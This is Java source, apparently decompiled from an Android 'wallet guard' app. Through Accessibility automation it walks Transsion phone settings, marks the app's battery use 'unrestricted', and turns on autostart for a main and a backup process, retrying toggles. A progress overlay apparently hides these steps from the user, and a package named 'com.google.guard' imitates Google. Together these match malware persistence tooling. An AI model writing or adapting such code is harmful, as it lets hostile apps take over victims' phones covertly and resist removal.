package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilterWithUpLevel;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 传音引擎开发者选项 Runnable。
 *
 * vendor 原始路径: o/d0.java (252 行)
 * 功能: 4 个 case — keepAliveInAppDetail / keepAliveInAppBattery /
 *       keepAliveInAutoStart / 默认 Z()。
 */
public final class OpenDevDelegateTask implements Runnable {
    public final int a;
    public final com.guard.wallet.engine.TranssionEngine b;

    public OpenDevDelegateTask(com.guard.wallet.engine.TranssionEngine e0Var, int i2) {
        this.a = i2;
        this.b = e0Var;
    }

    @Override
    public final void run() {
        UiObject findOneByCombine;
        String str;
        UiObject uiObject;
        int i2 = this.a;
        com.guard.wallet.engine.TranssionEngine e0Var = this.b;
        switch (i2) {
            case 0:
                /* keepAliveInAppDetail — find and click battery management */
                e0Var.getClass();
                try {
                    if (!e0Var.isInAppDetail()) {
                        return;
                    }
                    Log.d("o.e0", "keepAliveInAppDetail 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(10);
                    e0Var.G();
                    Log.d("o.e0", "active root complete");
                    UiObject Q = e0Var.findScrollableContainer();
                    if (Q != null) {
                        Log.d("o.e0", "应用详情窗口滚动视图查找成功");
                        com.guard.wallet.helper.BlockViewManager.h(15);
                        findOneByCombine = e0Var.scrollFindBatteryEntry(Q);
                    } else {
                        Log.e("o.e0", "应用详情窗口滚动视图查找失败");
                        findOneByCombine = e0Var.k().findOneByCombine(com.guard.wallet.engine.TranssionEngine.buildBatteryFilter());
                        if (findOneByCombine == null) {
                            findOneByCombine = e0Var.k().findOneByCombine(com.guard.wallet.engine.TranssionEngine.buildPowerFilter());
                        }
                    }
                    if (findOneByCombine != null) {
                        Log.d("o.e0", "查找应用电量管理已完成");
                        com.guard.wallet.helper.BlockViewManager.h(20);
                        UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(com.guard.wallet.engine.KeepAliveEngine.buildClickableNodeFilter());
                        if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                            Log.d("o.e0", "查找并点击应用的电量管理已完成");
                            com.guard.wallet.helper.BlockViewManager.h(30);
                            return;
                        }
                        str = "点击应用的电量管理失败";
                    } else {
                        str = "查找应用电量管理失败";
                    }
                    Log.e("o.e0", str);
                    return;
                } catch (Exception e2) {
                    AppUtils.s("o.e0", e2);
                    return;
                }

            case 1:
                /* keepAliveInAppBattery — set unrestricted and launch autostart */
                e0Var.getClass();
                try {
                    if (!e0Var.isInBatteryManagement()) {
                        return;
                    }
                    Log.d("o.e0", "keepAliveInAppBattery 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(40);
                    e0Var.G();
                    Log.d("o.e0", "active root complete");
                    UiObject findOneByOperateOr = e0Var.k().findOneByOperateOr(com.guard.wallet.engine.TranssionEngine.buildUnrestrictedOrFilter());
                    com.guard.wallet.enums.TaskState eVar = com.guard.wallet.enums.TaskState.c;
                    java.util.concurrent.atomic.AtomicReference atomicReference = e0Var.r;
                    if (findOneByOperateOr != null) {
                        com.guard.wallet.helper.BlockViewManager.h(45);
                        UiObject findParentUtilCombine2 = findOneByOperateOr.findParentUtilCombine(com.guard.wallet.engine.KeepAliveEngine.buildClickableLinearLayoutFilter());
                        if (findParentUtilCombine2 != null && findParentUtilCombine2.click()) {
                            Log.d("o.e0", "查找并点击无限制已完成");
                            com.guard.wallet.helper.BlockViewManager.h(50);
                            (Objects.equals(atomicReference.get(), eVar) ? e0Var.w : e0Var.x).set(true);
                        } else {
                            Log.e("o.e0", "查找并点击无限制失败");
                        }
                    }
                    if (Objects.equals(atomicReference.get(), eVar)) {
                        atomicReference.set(com.guard.wallet.enums.TaskState.d);
                        if (com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                            com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                            Log.d("o.e0", "com.google.guard".concat(" 应用详情已启动"));
                            "com.google.guard".concat(" 应用详情已启动");
                            return;
                        }
                    }
                    com.guard.wallet.utils.SystemHelper.d1("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
                    Log.d("o.e0", "自启动管理已启动");
                    return;
                } catch (Exception e3) {
                    AppUtils.s("o.e0", e3);
                    return;
                }

            case 2:
                /* keepAliveInAutoStart — find and toggle auto-start for both processes */
                e0Var.getClass();
                try {
                    if (!e0Var.isInAutoStartManagement()) {
                        return;
                    }
                    Log.d("o.e0", "keepAliveInAutoStart 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(60);
                    e0Var.G();
                    Log.d("o.e0", "active root complete");
                    CombineFilterWithUpLevel combineFilterWithUpLevel = new CombineFilterWithUpLevel(2, com.guard.wallet.engine.KeepAliveEngine.buildTextContainsFilter(com.guard.wallet.utils.SystemHelper.x0()));
                    CombineFilterWithUpLevel combineFilterWithUpLevel2 = new CombineFilterWithUpLevel(2, com.guard.wallet.engine.KeepAliveEngine.buildTextContainsFilter(com.guard.wallet.utils.SystemHelper.e()));
                    UiObject Q2 = e0Var.findScrollableContainer();
                    AtomicBoolean atomicBoolean3 = e0Var.v;
                    AtomicBoolean atomicBoolean4 = e0Var.u;
                    AtomicBoolean atomicBoolean5 = e0Var.t;
                    AtomicBoolean atomicBoolean6 = e0Var.s;
                    String str3 = "备用进程自启动未勾选";
                    if (Q2 != null) {
                        AtomicBoolean atomicBoolean7 = atomicBoolean3;
                        Log.d("o.e0", "自启动管理窗口滚动视图查找成功");
                        com.guard.wallet.helper.BlockViewManager.h(65);
                        UiObject uiObject2 = null;
                        UiObject uiObject3 = null;
                        CombineFilterWithUpLevel currentFilter1 = combineFilterWithUpLevel;
                        String currentStr3 = str3;
                        AtomicBoolean currentAB5 = atomicBoolean5;
                        AtomicBoolean currentAB7 = atomicBoolean7;
                        while (uiObject2 == null || uiObject3 == null) {
                            UiObject findParentByCombine = Q2.findParentByCombine(currentFilter1.getChildFilter(), currentFilter1.getUpLevel());
                            CombineFilterWithUpLevel combineFilterWithUpLevel3 = currentFilter1;
                            UiObject findParentByCombine2 = Q2.findParentByCombine(combineFilterWithUpLevel2.getChildFilter(), combineFilterWithUpLevel2.getUpLevel());
                            if (findParentByCombine != null) {
                                Log.d("o.e0", "主进程栏目查找成功");
                                com.guard.wallet.helper.BlockViewManager.h(70);
                                CheckedResult P = com.guard.wallet.engine.KeepAliveEngine.toggleCompoundButton(findParentByCombine);
                                if (!P.isChecked() && !P.isClicked()) {
                                    P = e0Var.toggleSwitchWithRetry(findParentByCombine, 5);
                                }
                                if (P.isClicked()) {
                                    Log.d("o.e0", "主进程自启动已点击");
                                }
                                if (P.isChecked()) {
                                    Log.d("o.e0", "主进程自启动已勾选");
                                    com.guard.wallet.helper.BlockViewManager.h(80);
                                    atomicBoolean6.set(true);
                                    atomicBoolean4.set(true);
                                } else {
                                    Log.e("o.e0", "主进程自启动未勾选");
                                }
                            }
                            if (findParentByCombine2 != null) {
                                Log.d("o.e0", "备用进程栏目查找成功");
                                com.guard.wallet.helper.BlockViewManager.h(75);
                                uiObject = findParentByCombine;
                                CheckedResult P2 = com.guard.wallet.engine.KeepAliveEngine.toggleCompoundButton(findParentByCombine2);
                                if (!P2.isChecked() && !P2.isClicked()) {
                                    P2 = e0Var.toggleSwitchWithRetry(findParentByCombine2, 5);
                                }
                                if (P2.isClicked()) {
                                    Log.d("o.e0", "备用进程自启动已点击");
                                }
                                if (P2.isChecked()) {
                                    Log.d("o.e0", "备用进程自启动已勾选");
                                    com.guard.wallet.helper.BlockViewManager.h(80);
                                    currentAB5 = currentAB5;
                                    currentAB5.set(true);
                                    uiObject3 = findParentByCombine2;
                                    currentAB7 = currentAB7;
                                    currentAB7.set(true);
                                } else {
                                    Log.e("o.e0", currentStr3);
                                    uiObject3 = findParentByCombine2;
                                }
                            } else {
                                uiObject = findParentByCombine;
                                uiObject3 = findParentByCombine2;
                            }
                            if (Q2.canScrollForward()) {
                                Q2.scrollForward();
                                com.guard.wallet.utils.SystemHelper.T0(5);
                                Q2.refresh();
                                currentFilter1 = combineFilterWithUpLevel3;
                                uiObject2 = uiObject;
                            } else {
                                break;
                            }
                        }
                    } else {
                        Log.e("o.e0", "自启动管理窗口滚动视图查找失败");
                        UiObject findParentByCombine3 = e0Var.k().findParentByCombine(combineFilterWithUpLevel.getChildFilter(), combineFilterWithUpLevel.getUpLevel());
                        UiObject findParentByCombine4 = e0Var.k().findParentByCombine(combineFilterWithUpLevel2.getChildFilter(), combineFilterWithUpLevel2.getUpLevel());
                        if (findParentByCombine3 != null) {
                            Log.d("o.e0", "主进程栏目查找成功");
                            com.guard.wallet.helper.BlockViewManager.h(75);
                            CheckedResult P3 = com.guard.wallet.engine.KeepAliveEngine.toggleCompoundButton(findParentByCombine3);
                            if (P3.isClicked()) {
                                Log.d("o.e0", "主进程自启动已点击");
                            }
                            if (P3.isChecked()) {
                                Log.d("o.e0", "主进程自启动已勾选");
                                com.guard.wallet.helper.BlockViewManager.h(80);
                                atomicBoolean6.set(true);
                                atomicBoolean4.set(true);
                            } else {
                                Log.e("o.e0", "主进程自启动未勾选");
                            }
                        }
                        if (findParentByCombine4 != null) {
                            Log.d("o.e0", "备用进程栏目查找成功");
                            com.guard.wallet.helper.BlockViewManager.h(75);
                            CheckedResult P4 = com.guard.wallet.engine.KeepAliveEngine.toggleCompoundButton(findParentByCombine4);
                            if (P4.isClicked()) {
                                Log.d("o.e0", "备用进程自启动已点击");
                            }
                            if (P4.isChecked()) {
                                Log.d("o.e0", "备用进程自启动已勾选");
                                com.guard.wallet.helper.BlockViewManager.h(80);
                                atomicBoolean5.set(true);
                                atomicBoolean3.set(true);
                            } else {
                                Log.e("o.e0", str3);
                            }
                        }
                    }
                    e0Var.savePowerControlState();
                    e0Var.Z();
                    return;
                } catch (Exception e4) {
                    AppUtils.s("o.e0", e4);
                    return;
                }

            default:
                e0Var.Z();
                return;
        }
    }
}
